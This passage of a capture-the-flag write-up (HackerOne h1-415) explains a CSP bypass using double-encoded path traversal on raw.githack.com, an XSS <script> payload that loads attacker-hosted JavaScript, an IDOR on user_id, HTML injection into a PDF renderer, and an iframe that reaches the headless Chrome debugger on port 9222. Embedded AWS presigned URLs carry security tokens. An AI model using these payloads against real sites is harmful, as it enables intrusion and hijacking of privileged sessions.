slxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=8b176cb7c09e7575dd52ed8f11f1550591483ece9654a266f8b44b39199c9a29\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe second unusual thing about this CSP rule was that normally a base domain is whitelisted, not a full URL path.  This was new to me, so I spent some time on Google to determine how fully qualified URLs and paths are handled in CSP rules.  This turned out to be way more frustrating than expected.  For example, the following page is a common reference for CSP details:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FContent-Security-Policy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLooking through the whole page, there is no mention at all of how paths are handled.  So I moved on to testing Chrome\u0026#39;s CSP behaviour myself.  This showed that:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIf the CSP includes a full URL, Chrome will treat any content under that URL path (any file or subdirectory) as allowed.\u003c/li\u003e\n\u003cli\u003eChrome will block anything in parent directories or the base server.\u003c/li\u003e\n\u003cli\u003ePaths are \u0026quot;normalized\u0026quot; before evaluating, meaning that simply path traversals are blocked.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWhile attempting a basic path traversal against the CSP policy failed, it made me wonder how Chrome would have any idea whether or not a path traversal was taking place.  Testing showed that Chrome evaluates the \u0026quot;resulting\u0026quot; path the same way as when you\u0026#39;re entering an URL in the address bar.  If I enter \u003ccode\u003ehttp://exfiltrated.com/url/demo/../test\u003c/code\u003e in my browser, the URL that Chrome will request will be \u003ccode\u003ehttp://exfiltrated.com/url/test\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eThis led to the next obvious thing to try, \u003cu\u003eURL encoding the path\u003c/u\u003e to prevent it from being normalized.  If you\u0026#39;ve ever made URL encoded requests to a web server you will know that \u003cem\u003eservers\u003c/em\u003e often do not care if a path is URL encoded, they will first decode your requested path and then attempt to load your page.  For CSP\u0026#39;s I quickly discovered that Chrome would appear to know that \u003ccode\u003e%2e\u003c/code\u003e was the same as \u003ccode\u003e.\u003c/code\u003e, but it would not decode \u003ccode\u003e%2f\u003c/code\u003e as \u003ccode\u003e/\u003c/code\u003e.  This means that Chrome CSP parser \u003cem\u003ewould\u003c/em\u003e accept the following URL:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly tested to see how the Githack server would handle this style of request and it turns out to happily parse our URL encoded path, follow the traversal, and give us our target page!  This means we can finally bypass the CSP policy on this website by hosting our own Javascript on Github and then using a path traversal to reference that script.  Note that githack.com is basically just a proxy service for Github, so having our own content hosted on that domain is as simple as making a new Github repository.\u003c/p\u003e\n\n\u003cp\u003eTo reference the Github hosted script on the support page I used the following for the message contents:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script src=\u0026quot;https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fw--/a/master/csp-done19.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote that our %2f path is URL encoded twice - once for the original \u003ccode\u003e/support\u003c/code\u003e page to decode, and once to bypass the CSP policy on the support team bot\u0026#39;s browser.  A hint / Easter egg at this point is that any time you include a script tag in your message to the support chat the response is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eWow, that\u0026#39;s cosmic.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m not sure if a \u0026lt;script\u0026gt; tag is truely cosmic brain, but it\u0026#39;s on the right path :)  \u003c/p\u003e\n\n\u003cp\u003eTriggering this message to be reviewed by the support team bot finally resulted in a successful XSS attack!  Unfortunately I ended up being stuck here for a couple hours due to instability on the challenge server, and a couple bugs in my Javascript.  The challenge server would restart hourly (at 35 minutes past the hour), but between the restarts it would sometimes end up in bad states.  One of these was the state where the \u003ccode\u003e/support/feedback\u003c/code\u003e API wouldn\u0026#39;t actually trigger the support chat being loaded by the support team bot.  This was simple enough to debug, but ultimately took a while.\u003c/p\u003e\n\n\u003cp\u003eWith full XSS access I started to look into how we could leverage the support team bot\u0026#39;s session.  Unfortunately session cookies were set to \u003ccode\u003ehttponly\u003c/code\u003e so only the \u003ccode\u003ecsrf\u003c/code\u003e token could be retrieved from the cookies.  After spending some time looking at the page details that was loaded on the support bot browser I eventually looked up the \u003ccode\u003ewindow.location\u003c/code\u003e value.  This showed that the URL the support bot was accessing the chat log from was:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://localhost:3000/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRather than attempting to make requests to this via \u003ccode\u003eXMLHttpRequest\u0026#39;s\u003c/code\u003e, I tried the following URL in my browser:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://h1-415.h1ctf.com/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e...and it worked!  Our support chat session is loaded, along with some additional user details.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"support-review.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XbButngq1zNdHhZ4xYMhJhPF?response-content-disposition=attachment%3B%20filename%3D%22support-review.png%22%3B%20filename%2A%3DUTF-8%27%27support-review.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=96fefeddd49316fabc3858ff192edd9a7ebce310f9289300c8fc50f26c0bbe69\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XbButngq1zNdHhZ4xYMhJhPF?response-content-disposition=attachment%3B%20filename%3D%22support-review.png%22%3B%20filename%2A%3DUTF-8%27%27support-review.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=96fefeddd49316fabc3858ff192edd9a7ebce310f9289300c8fc50f26c0bbe69\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"second-vulnerability-part-2-tldr\"\u003eSecond vulnerability - Part 2 - TLDR\u003c/h2\u003e\n\n\u003cp\u003e1) A CSP is blocking all script execution.\u003cbr\u003e\n2) The \u003ccode\u003escript-src\u003c/code\u003e rule allows scripts from \u003ccode\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/\u003c/code\u003e.\u003cbr\u003e\n3) We can abuse the allowed path by URL encoding our script path.  Use \u003ccode\u003e%2f\u003c/code\u003e instead of \u003ccode\u003e/\u003c/code\u003e to perform a directory traversal server-side, but trick Chrome into thinking we are still referencing a valid path.  For example: \u003ccode\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js\u003c/code\u003e.\u003cbr\u003e\n4) In our attacker Javascript we need to read the \u003ccode\u003ewindow.location\u003c/code\u003e property to find the magic URL that will give us access to the support feedback review page.\u003c/p\u003e\n\n\u003ch2 id=\"third-vulnerability\"\u003eThird vulnerability\u003c/h2\u003e\n\n\u003cp\u003eHaving access to the support feedback review page at first only appears to give access to a copy of our own messages.  It also shows Jobert\u0026#39;s profile details, but we \u003cem\u003ealso\u003c/em\u003e already have access to those.  This page, just like the \u003ccode\u003e/settings\u003c/code\u003e page examined earlier also does not let us change Jobert\u0026#39;s details.  The only new item appears to be the \u003ccode\u003eBan User\u003c/code\u003e button.  \u003c/p\u003e\n\n\u003cp\u003eExamining the \u003ccode\u003eBan User\u003c/code\u003e button showed that it is disabled \u003cem\u003eand\u003c/em\u003e no Javascript appears to exist to handle any actions if it were enabled.  The \u003ccode\u003eSave\u003c/code\u003e button causes a \u003ccode\u003ePOST\u003c/code\u003e request to the \u003ccode\u003e/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb\u003c/code\u003e URL instead of the normal \u003ccode\u003e/settings\u003c/code\u003e URL, but otherwise appeared the exact same.\u003c/p\u003e\n\n\u003cp\u003eOne of the things I noticed on the \u003ccode\u003e/settings\u003c/code\u003e page as a regular user is that the request includes a parameter \u003ccode\u003euser_id\u003c/code\u003e, which is just a numeric value.  The same parameter is passed when the \u003ccode\u003e/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb\u003c/code\u003e API is accessed.  As a test, I changed this to a random number, and unlike on the \u003ccode\u003e/settings\u003c/code\u003e API this worked.  To confirm, I registered a new user account and looked up the \u003ccode\u003euser_id\u003c/code\u003e value on the \u003ccode\u003e/settings\u003c/code\u003e page.  Then I made a change via the support page to my test user.  Sure enough, the changes took effect.\u003c/p\u003e\n\n\u003cp\u003eRight from the beginning of this challenge it felt like abusing the PDF generation should be part of the CTF, so the first thing I tried was to include special characters in the \u003ccode\u003ename\u003c/code\u003e field when updating via the support page.  This time it worked!\u003c/p\u003e\n\n\u003cp\u003eTrying template injection attacks like \u003ccode\u003e{{7*7}}\u003c/code\u003e and \u003ccode\u003e${7*7}\u003c/code\u003e was not successful.  Including HTML tags however \u003cem\u003ewas\u003c/em\u003e successful and these rendered inside the PDF.  Since the \u003ccode\u003ename\u003c/code\u003e field length was limited I attempted to reference an external Javascript page source.  This time no CSP policy blocked the script and I could directly load Javascript from any URL!\u003c/p\u003e\n\n\u003cp\u003eAt this point I started enumerating details about the PDF generation page.  The URL the page was called from was:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://localhost:3000/converter/bd0bde8f600a8a6df01ed973809cc7bc4e487a00212df0085ec6ef4f4deb42a9?user_name=demo\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUnlike on the second vulnerability, accessing this URL was not possible via the \u003ccode\u003ehttps://h1-415.h1ctf.com/\u003c/code\u003e website - a error \u003ccode\u003e403\u003c/code\u003e would be returned.  After trying a lot of things I scripted outputting all of the \u003ccode\u003edocument\u003c/code\u003e object properties.  This unfortunately did not give any more clues.  During this process however I did observe that I could easily extract page outputs, even across other websites by including a \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e tag.  The PDF would render and display the \u003ccode\u003eiframe\u003c/code\u003e contents.  This led to a lot of failed attacks:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAccess other internal network hosts\u003c/li\u003e\n\u003cli\u003eFind an accessible page on the webserver on localhost running on port 80 (as opposed to 3000)\u003c/li\u003e\n\u003cli\u003eFind a page on port 3000 that the PDF rendering system could access\u003c/li\u003e\n\u003cli\u003eAccess the local filesystem via \u003ccode\u003efile://\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA variety of other CTF\u0026#39;s in the past have included challenges where reading files via the \u003ccode\u003efile://\u003c/code\u003e handler was required.  Checking into the Chrome policies for this however showed that no access to pages on \u003ccode\u003efile://\u003c/code\u003e is allowed \u003cem\u003eat all\u003c/em\u003e unless the parent page is also loaded from a \u003ccode\u003efile://\u003c/code\u003e path:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"no-file-access.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1pdLRBeZ5otfDKp796k7AsWj?response-content-disposition=attachment%3B%20filename%3D%22no-file-access.png%22%3B%20filename%2A%3DUTF-8%27%27no-file-access.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=ec93cf458664c371cb39579472f96ccb9ae12ac4e95f08150f46087c7ebecd9b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1pdLRBeZ5otfDKp796k7AsWj?response-content-disposition=attachment%3B%20filename%3D%22no-file-access.png%22%3B%20filename%2A%3DUTF-8%27%27no-file-access.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=ec93cf458664c371cb39579472f96ccb9ae12ac4e95f08150f46087c7ebecd9b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLooking at options for loading files from Chrome however led to a reference to the Chrome debugger, which for headless version of Chrome especially is often enabled.  On the second vulnerability and on this one the user agent indicated that headless Chrome was in use, so this seemed like a good possibility.  By default, the debugger port in on \u003ccode\u003e9222\u003c/code\u003e.  To check if this was accessible the following script code was used:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edocument.write(\u0026quot;\u0026lt;hr\u0026gt;\u0026lt;iframe src=\u0026#39;http://localhost:9222/\u0026#39; width=\u0026#39;900\u0026#39; height=\u0026#39;1000\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSure enough it \u003cem\u003ewas\u003c/em\u003e accessible.  The default page doesn\u0026#39;t show much, so the next page I checked was \u003ccode\u003ehttp://localhost:9222/json\u003c/code\u003e.  Finally this revealed what was needed:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"iframe-devtools.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2TDJkTkdWEf84jEGSW3z2YUc?response-content-disposition=attachment%3B%20filename%3D%22iframe-devtools.png%22%3B%20filename%2A%3DUTF-8%27%27iframe-devtools.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=1321fa2ef00293f9eda3dcd297692fe8c367adae494fdecc6740108003ac0506\" data-attachment-type=\"image/png\"\u003e\u003cimg 